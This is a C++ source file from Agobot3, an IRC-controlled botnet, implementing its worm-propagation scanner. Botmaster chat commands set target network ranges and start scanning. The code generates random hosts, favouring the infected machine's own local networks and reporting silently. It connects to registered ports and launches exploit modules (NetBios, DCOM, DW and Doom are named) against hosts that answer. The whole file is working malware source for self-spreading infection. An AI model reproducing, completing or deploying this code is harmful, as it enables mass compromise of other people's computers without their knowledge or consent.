/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "scanner.h"
#include "mainctrl.h"

ScannerInfo		g_iScanners[64]=
{	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false },
	{ NULL, 0, NULL, false, 0, NULL, false }, { NULL, 0, NULL, false, 0, NULL, false } };

int				g_iPortsToScan[64] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
int volatile	g_iNumScanThreads=0;
list<CScannerBase*> g_lScanners;

bool ParseNetRange(const CString &sInput, CNetRange &nRange)
{	// Netrange is never longer than 18 characters
	if(sInput.GetLength()>18) return false;

	// Get temp storage and copy the string
	char *szTemp=new char[sInput.GetLength()+2];
	sprintf(szTemp, "%s", sInput.CStr());

	// Get number of dots and slashes in the string
	int iDotCount=0, iSlashCount=0;
	for(int i=0; i<strlen(szTemp); i++)
	{	if(szTemp[i]=='.') iDotCount++;
		else if(szTemp[i]=='/') iSlashCount++; }

	// If there are no 3 dots or there is no slash, fail
	if(iDotCount!=3) { delete [] szTemp; return false; }
	if(iSlashCount!=1) { delete [] szTemp; return false; }

	// Make a copy of the string into a CString and parse it
	CString sTemp(szTemp);
	nRange.iPart1=atoi(sTemp.Token(0, "/").Token(0, ".").CStr());
	nRange.iPart2=atoi(sTemp.Token(0, "/").Token(1, ".").CStr());
	nRange.iPart3=atoi(sTemp.Token(0, "/").Token(2, ".").CStr());
	nRange.iPart4=atoi(sTemp.Token(0, "/").Token(3, ".").CStr());
	nRange.iNetMask=atoi(sTemp.Token(1, "/").CStr());

	// Fail if the parts are 0
	if(!nRange.iPart1 && !nRange.iPart2 && !nRange.iPart3 && !nRange.iPart4)
	{	delete [] szTemp; return false; }

	// Fail if the netmask is not a multiple of 8
	if((nRange.iNetMask%8)!=0)
	{	delete [] szTemp; return false; }

	// Success
	delete [] szTemp; return true; }

void RegisterScanner(ScannerInfo *pScanner)
{	int i; for(i=0; i<sizeof(g_iScanners); i++)
	{	ScannerInfo *pTemp=&g_iScanners[i];
		if(pTemp->pAllocator==NULL)
		{	memcpy(pTemp, pScanner, sizeof(ScannerInfo));
			break; } }

	for(i=0; i<sizeof(g_iPortsToScan); i++)
	{	int *pPort=&g_iPortsToScan[i];
		if(*pPort==pScanner->sPort) break;
		if(!*pPort) { *pPort=pScanner->sPort; break; } }
}

ScannerInfo *GetScannerByPort(const unsigned short sPort, int iIndex=0)
{	if(!sPort) return NULL;
	int iIndexNow=0; for(int i=0; i<sizeof(g_iScanners); i++)
	{	
		ScannerInfo *pTemp=&g_iScanners[i];
		if(pTemp->pAllocator==NULL || pTemp->szScannerName==NULL || pTemp->sPort==0)
			break;

		if(pTemp->sPort==sPort)
		{
			if(iIndexNow==iIndex) return pTemp;
			iIndexNow++;
		}
	}
	return NULL; }

ScannerInfo *GetScannerByName(const char *szName, int iIndex=0)
{	if(!szName) return NULL;
	int iIndexNow=0; for(int i=0; i<sizeof(g_iScanners); i++)
	{	ScannerInfo *pTemp=&g_iScanners[i];
		if(pTemp->pAllocator==NULL || pTemp->szScannerName==NULL || pTemp->szScannerName==NULL)
			break;
		if(!strcmp(pTemp->szScannerName, szName))
		{
			if(iIndexNow==iIndex) return pTemp;
			iIndexNow++;
		}
	}
	return NULL; }

void IncrementScanStats(const char *szScannerName, const short sPort)
{	if(!sPort || !szScannerName) return;
	for(int i=0; i<sizeof(g_iScanners); i++)
	{	ScannerInfo *pTemp=&g_iScanners[i];
		if(pTemp->pAllocator==NULL || pTemp->szScannerName==NULL) continue;
		if(!strcmp(pTemp->szScannerName, szScannerName) && pTemp->sPort==sPort)
		{
			*pTemp->pScanStats++; break;
		}
	}
}

void ResetScanStats()
{	for(int i=0; i<sizeof(g_iScanners); i++)
	{	ScannerInfo *pTemp=&g_iScanners[i]; if(!pTemp->pAllocator==NULL) continue;
		*pTemp->pScanStats=0; } }

void CNetRange::operator=(const CNetRange &nRange)
{	iPart1=nRange.iPart1; iPart2=nRange.iPart2;
	iPart3=nRange.iPart3; iPart4=nRange.iPart4;
	iNetMask=nRange.iNetMask; iPriority=nRange.iPriority;
	bSilent=nRange.bSilent; bNotice=nRange.bNotice;
	sReplyTo=nRange.sReplyTo; pScanner=nRange.pScanner; }

bool CNetRange::operator==(const CNetRange &nRange)
{	return	( 	(iPart1==nRange.iPart1) && \
				(iPart2==nRange.iPart2) && \
				(iPart3==nRange.iPart3) && \
				(iPart4==nRange.iPart4) && \
				(iNetMask==nRange.iNetMask) ); }

void CScanner::Init()
{	m_bScanning=false;

	REGCMD(m_cmdAddNetRange,	"scan.addnetrange",		"adds a netrange to the scanner",					false,	this);
	REGCMD(m_cmdDelNetRange,	"scan.delnetrange",		"deletes a netrange from the scanner",				false,	this);
	REGCMD(m_cmdListNetRanges,	"scan.listnetranges",	"lists all netranges registered with the scanner",	false,	this);
	REGCMD(m_cmdClearNetRanges,	"scan.clearnetranges",	"clears all netranges registered with the scanner",	false,	this);
	REGCMD(m_cmdResetNetRanges,	"scan.resetnetranges",	"resets netranges to the localhost",	false,	this);
	REGCMD(m_cmdEnableScanner,	"scan.enable",			"enables a scanner module",							false,	this);
	REGCMD(m_cmdDisableScanner,	"scan.disable",			"disables a scanner module",						false,	this);
	REGCMD(m_cmdStart,			"scan.start",			"signal start to child threads",					false,	this);
	REGCMD(m_cmdStop,			"scan.stop",			"signal stop to child threads",						false,	this);

	m_cPortScanner.AddLocalLAN();

	// Start a non-dynamic, auto-restarting thread
	m_cPortScanner.Start(false, true);

//	m_cPortScanner.EnableScanner("NetBios");
//	m_cPortScanner.EnableScanner("DW");
//	m_cPortScanner.EnableScanner("DCOM");
//	m_cPortScanner.EnableScanner("Doom");

//	m_bScanning=true;
}

bool CScanner::HandleCommand(CMessage *pMsg)
{	CNetRange nRange;

	if(!pMsg->sCmd.Compare("scan.addnetrange"))
	{	CString sNetRange=pMsg->sChatString.Token(1, " ");
		CString sPriority=pMsg->sChatString.Token(2, " ");
		nRange.iPriority=atoi(sPriority.CStr());
		nRange.pScanner=this; nRange.sReplyTo=pMsg->sReplyTo;
		nRange.bNotice=pMsg->bNotice; nRange.bSilent=pMsg->bSilent;

		if(ParseNetRange(sNetRange, nRange))
			m_cPortScanner.RegisterNetRange(&nRange); }

	else if(!pMsg->sCmd.Compare("scan.delnetrange"))
	{	CString sNetRange=pMsg->sChatString.Token(1, " ");

		if(ParseNetRange(sNetRange, nRange))
			m_cPortScanner.RemoveNetRange(&nRange); }


	else if(!pMsg->sCmd.Compare("scan.resetnetranges"))
	{	m_cPortScanner.m_lNetRanges.clear();
	    m_cPortScanner.AddLocalLAN();
	
	}
	
	else if(!pMsg->sCmd.Compare("scan.listnetranges"))
	{	g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "-[ netrange list ]-", pMsg->sReplyTo.Str());
		list<CNetRange>::iterator i; int iCount=0;
		for(i=m_cPortScanner.m_lNetRanges.begin(); i!=m_cPortScanner.m_lNetRanges.end(); i++)
		{	iCount++; g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, "%d. mask: %d.%d.%d.%d/%d prio: %d", iCount,
				(*i).iPart1, (*i).iPart2, (*i).iPart3, (*i).iPart4, (*i).iNetMask, (*i).iPriority);
			Sleep(1500); } }

	else if(!pMsg->sCmd.Compare("scan.clearnetranges"))
	{	m_cPortScanner.m_lNetRanges.clear(); }

	else if(!pMsg->sCmd.Compare("scan.enable"))
		m_cPortScanner.EnableScanner(pMsg->sChatString.Token(1, " ").CStr());

	else if(!pMsg->sCmd.Compare("scan.disable"))
		m_cPortScanner.DisableScanner(pMsg->sChatString.Token(1, " ").CStr());

	else if(!pMsg->sCmd.Compare("scan.start"))
		m_bScanning=true;

	else if(!pMsg->sCmd.Compare("scan.stop"))
		m_bScanning=false;

	return true; }

void *CScannerBase::Run()
{	unsigned short sPortBackup=m_sSocket.m_sPort;
	g_lScanners.push_back(this);
	if(Exploit()) IncrementScanStats(m_sScannerName.CStr(), sPortBackup);
	g_lScanners.remove(this); return NULL; }

bool CScannerBase::Exploit()
{	// Override plz
	return false; }

void CScannerBase::SendLocal(const char *szFormat, ...)
{	va_list va_alist; char szBuf[8192]; va_start(va_alist, szFormat);
	vsnprintf(szBuf, sizeof(szBuf), szFormat, va_alist); va_end(va_alist);
	g_pMainCtrl->m_cIRC.SendFormat(m_pNetRange.bSilent, m_pNetRange.bNotice, m_pNetRange.sReplyTo.Str(), "%s", szBuf); }

CPortScanner::CPortScanner() { m_sConnections=NULL; m_iNumSockets=0; }
CPortScanner::~CPortScanner()
{	for(list<CScannerBase*>::iterator is=g_lScanners.begin(); is!=g_lScanners.end(); is++) delete (*is);
	if(m_sConnections) { for(int i=0; i<m_iNumSockets; i++) m_sConnections[i].m_sSocket.Disconnect(); delete [] m_sConnections; m_sConnections=NULL; } }

CNetRange *GetNetRange(list<CNetRange> &plNetRanges)
{	int iHighestScore=0; CNetRange *pNetRange=NULL;
	for(list<CNetRange>::iterator in=plNetRanges.begin(); in!=plNetRanges.end(); in++)
	{	int iScore=brandom(0, (*in).iPriority);
		if(iScore > iHighestScore) { iHighestScore=iScore; pNetRange=&(*in); } }
	return pNetRange; }

CString GetHost(CNetRange *pNetRange)
{	if(!pNetRange) return CString(""); CString sRetVal; switch(pNetRange->iNetMask) {
	case 0:		sRetVal.Format("%d.%d.%d.%d", brandom(0, 255),		brandom(0, 255),	brandom(0, 255),	brandom(0, 255)		); break;
	case 8:		sRetVal.Format("%d.%d.%d.%d", pNetRange->iPart1,	brandom(0, 255),	brandom(0, 255),	brandom(0, 255)		); break;
	case 16:	sRetVal.Format("%d.%d.%d.%d", pNetRange->iPart1,	pNetRange->iPart2,	brandom(0, 255),	brandom(0, 255)		); break;
	case 24:	sRetVal.Format("%d.%d.%d.%d", pNetRange->iPart1,	pNetRange->iPart2,	pNetRange->iPart3,	brandom(0, 255)		); break;
	default:
	case 32:	sRetVal.Format("%d.%d.%d.%d", pNetRange->iPart1,	pNetRange->iPart2,	pNetRange->iPart3,	pNetRange->iPart4	); break; }
	return sRetVal; }

void *CPortScanner::Run()
{	fd_set fdSet; int i; init_random();

	// Allocate a sockets array if there is none
	if(!m_sConnections)
	{	m_iNumSockets=g_pMainCtrl->m_cBot.scan_maxsockets.iValue;
		m_sConnections=new ConnectionInfo[m_iNumSockets]; }
	
	while(m_bRunning)
	{	// Sleep till the scanner is enabled
		while(!g_pMainCtrl->m_cScanner.m_bScanning) Sleep(1000);
		while(!g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) Sleep(1000);
		
		// If queue is empty we need more targets, generate some
		if(m_lTargetQueue.empty()) for(i=0; i<64; i++)
		{	// Get a new netrange to scan based on priority
			CNetRange *pNetRange=GetNetRange(m_lNetRanges);
			// Sleep till theres a netrange
			while(!pNetRange) { Sleep(1000); pNetRange=GetNetRange(m_lNetRanges); }
			// Get a host in the netrange
			CString sHost=GetHost(pNetRange);
			// Check if the host is the local ip
			while(!sHost.Compare(g_pMainCtrl->m_cIRC.m_sLocalIp))
			{	Sleep(100); sHost=GetHost(pNetRange); }
			// Push the hostname into the queue
			TargetInfo tInfo; tInfo.sHost=sHost; tInfo.sPort=0; tInfo.pNetRange=*pNetRange;
			m_lTargetQueue.push_back(tInfo); }
		
		// Get all free sockets
		list<ConnectionInfo*> lFreeSockets; for(int i=0; i<m_iNumSockets; i++)
			if(m_sConnections[i].m_sSocket.GetSocket()==SOCKET_ERROR || m_sConnections[i].m_sSocket.GotError())
			{	m_sConnections[i].m_sSocket.Disconnect();
				lFreeSockets.push_back(&m_sConnections[i]); }

		// Init sTargetHost with a host from the queue and set iTargetPort
		// to the first port registered and iPortNum to 0
		TargetInfo sTargetHost=m_lTargetQueue.front(); m_lTargetQueue.pop_front();
		int iPortNum=0; int iTargetPort=g_iPortsToScan[iPortNum];
		// Loop till free sockets are depleted
		while(!lFreeSockets.empty())
		{	
			ScannerInfo *pScannerInfo=GetScannerByPort(iTargetPort, 0);
			int iIndex=0; bool bGotScanner=false;
			while(pScannerInfo) {
				if(pScannerInfo->bEnabled)
					bGotScanner=true;
				iIndex++; pScannerInfo=GetScannerByPort(iTargetPort, iIndex);
			}

			if(!bGotScanner) {
				iPortNum++; if(!g_iPortsToScan[iPortNum])
				{	sTargetHost=m_lTargetQueue.front(); m_lTargetQueue.pop_front(); iPortNum=0; }
				iTargetPort=g_iPortsToScan[iPortNum];
				continue; }
			
			// Get the next free socket
			ConnectionInfo *pConn=lFreeSockets.front(); lFreeSockets.pop_front();

			// Initiate an asynchronous connection
			sTargetHost.sPort=iTargetPort;
			pConn->m_sSocket.Connect(sTargetHost.sHost.CStr(), iTargetPort, true);
			pConn->m_pTargetInfo.pNetRange=sTargetHost.pNetRange;
			pConn->m_pTargetInfo.sHost=sTargetHost.sHost;
			pConn->m_pTargetInfo.sPort=iTargetPort;
			pConn->m_lStartupTime=GetTickCount();

			// Break if we have no more targets
			if(m_lTargetQueue.empty()) break;

			// Increment the port number, if the resulting port is 0, sTargetHost
			// has to be replaced with a fresh host from the queue and iPortNum
			// has to be reset to 0 again.
			iPortNum++; if(!g_iPortsToScan[iPortNum])
			{	sTargetHost=m_lTargetQueue.front(); m_lTargetQueue.pop_front(); iPortNum=0; }
			iTargetPort=g_iPortsToScan[iPortNum]; }


		// Get all free sockets
		for(i=0; i<m_iNumSockets; i++)
			if(m_sConnections[i].m_sSocket.GetSocket()!=SOCKET_ERROR)
			{	if(m_sConnections[i].m_sSocket.GotError()) m_sConnections[i].m_sSocket.Disconnect();
				else if(m_sConnections[i].m_sSocket.IsConnected())
				{
					// Get scanner info for connection based on the port
					ScannerInfo *pScannerInfo=GetScannerByPort(m_sConnections[i].m_sSocket.m_sPort, 0);
					int iIndex=0; int iIndexEnabled=0;
					
					// Loop till theres no scanner info left anymore (this can create a little
					// more threads than specified in scan_maxthreads, but only ~3 or sth like that.
					while(pScannerInfo) {

						// Check if the scanner is enabled
						if(pScannerInfo->bEnabled)
						{
							// Wait till there are no more scan threads than maximum, if the scanner is no fast scanner
//							if(!pScannerInfo->bFastScan)
//								while(g_lScanners.size() >= g_pMainCtrl->m_cBot.scan_maxthreads.iValue) Sleep(1000);

							if(	g_lScanners.size() < g_pMainCtrl->m_cBot.scan_maxthreads.iValue ||
								pScannerInfo->bFastScan)
							{
								// Increment port-hit statistics counter
								pScannerInfo->iPortHit++;

								// Get a new scanner instance and push it into the scanner list
								CScannerBase *pScanner=pScannerInfo->pAllocator();
								pScanner->m_pNetRange=m_sConnections[i].m_pTargetInfo.pNetRange;

								// Its the first of possibly multiple ports, so we can inherit the socket
								if(iIndexEnabled>0) {
									// Clone the connection info
									m_sConnections[i].m_sSocket.CloneToTemp(pScanner->m_sSocket);
									// Clear old socket
									m_sConnections[i].m_sSocket.ClearSocket();
									// Not asynchronous
									pScanner->m_sSocket.SetAsync(false);

									// Start the scanner
									pScanner->Start(true, false);
								} else {
									// Clone the connection info
									m_sConnections[i].m_sSocket.CloneToTemp(pScanner->m_sSocket);
									// Inherit the socket
									pScanner->m_sSocket=m_sConnections[i].m_sSocket;
									// Clear old socket
									m_sConnections[i].m_sSocket.ClearSocket();
									// Not asynchronous
									pScanner->m_sSocket.SetAsync(false);

									// Start the scanner
									pScanner->Start(true, false);
								}
								iIndexEnabled++;
							}
						}

						// Get next scanner info
						iIndex++; pScannerInfo=GetScannerByPort(m_sConnections[i].m_sSocket.m_sPort, iIndex);
					}
					if(iIndexEnabled==0) m_sConnections[i].m_sSocket.Disconnect();
				}
				else if((GetTickCount()-m_sConnections[i].m_lStartupTime) > 15000)
				{	// Timeout
					m_sConnections[i].m_sSocket.Disconnect(); }
			}

		Sleep(25);
	}

	return NULL; }

void CPortScanner::RegisterNetRange(CNetRange *pNetRange)
{	list<CNetRange>::iterator i;
	for(i=m_lNetRanges.begin(); i!=m_lNetRanges.end(); i++)
	{	if(	(*i).iPart1==pNetRange->iPart1 && (*i).iPart2==pNetRange->iPart2 &&
			(*i).iPart3==pNetRange->iPart3 && (*i).iPart4==pNetRange->iPart4 &&
			(*i).iNetMask==pNetRange->iNetMask) return; }		
	m_lNetRanges.push_back(*pNetRange); }
void CPortScanner::RemoveNetRange(CNetRange *pNetRange) { m_lNetRanges.remove(*pNetRange); }

bool CPortScanner::EnableScanner(const char *szName) {
	if(!szName) return NULL;
	for(int i=0; i<sizeof(g_iScanners); i++)
	{	ScannerInfo *pTemp=&g_iScanners[i];
		if(pTemp->pAllocator==NULL || pTemp->szScannerName==NULL) break;
		if(!strcmp(pTemp->szScannerName, szName))
			pTemp->bEnabled=true;
	}
	return true; }

bool CPortScanner::DisableScanner(const char *szName) {
	if(!szName) return NULL;
	for(int i=0; i<sizeof(g_iScanners); i++)
	{	ScannerInfo *pTemp=&g_iScanners[i];
		if(pTemp->pAllocator==NULL || pTemp->szScannerName==NULL) break;
		if(!strcmp(pTemp->szScannerName, szName))
			pTemp->bEnabled=false;
	}
	return true; }

void CPortScanner::AddLocalLAN() {
	while(!g_pMainCtrl->m_cIRC.m_bJoined) Sleep(1000);
	while(!g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) Sleep(1000);
	CString sLocalIp=g_pMainCtrl->m_cIRC.m_sLocalIp;
	int iLocalPart1=atoi(sLocalIp.Token(0, ".").CStr());
	int iLocalPart2=atoi(sLocalIp.Token(1, ".").CStr());
	int iLocalPart3=atoi(sLocalIp.Token(2, ".").CStr());
	int iLocalPart4=atoi(sLocalIp.Token(3, ".").CStr());

	CNetRange *nRange=new CNetRange;
	nRange->iPart1=iLocalPart1; nRange->iPart2=iLocalPart2; nRange->iPart3=iLocalPart3;
	nRange->iPart4=0; nRange->iNetMask=24; nRange->iPriority=80;
	nRange->bNotice=false; nRange->bSilent=true; nRange->sReplyTo.Assign(""); nRange->pScanner=&g_pMainCtrl->m_cScanner;

	RegisterNetRange(nRange);

	nRange=new CNetRange;
	nRange->iPart1=iLocalPart1; nRange->iPart2=iLocalPart2; nRange->iPart3=0; nRange->iPart4=0;
	nRange->iNetMask=16; nRange->iPriority=90; nRange->bNotice=false; nRange->bSilent=true;
	nRange->sReplyTo.Assign(""); nRange->pScanner=&g_pMainCtrl->m_cScanner;

	RegisterNetRange(nRange);

	nRange=new CNetRange;
	nRange->iPart1=iLocalPart1; nRange->iPart2=0; nRange->iPart3=0; nRange->iPart4=0;
	nRange->iNetMask=8; nRange->iPriority=100; nRange->bNotice=false; nRange->bSilent=true; nRange->sReplyTo.Assign("");
	nRange->pScanner=&g_pMainCtrl->m_cScanner;

	RegisterNetRange(nRange);
}
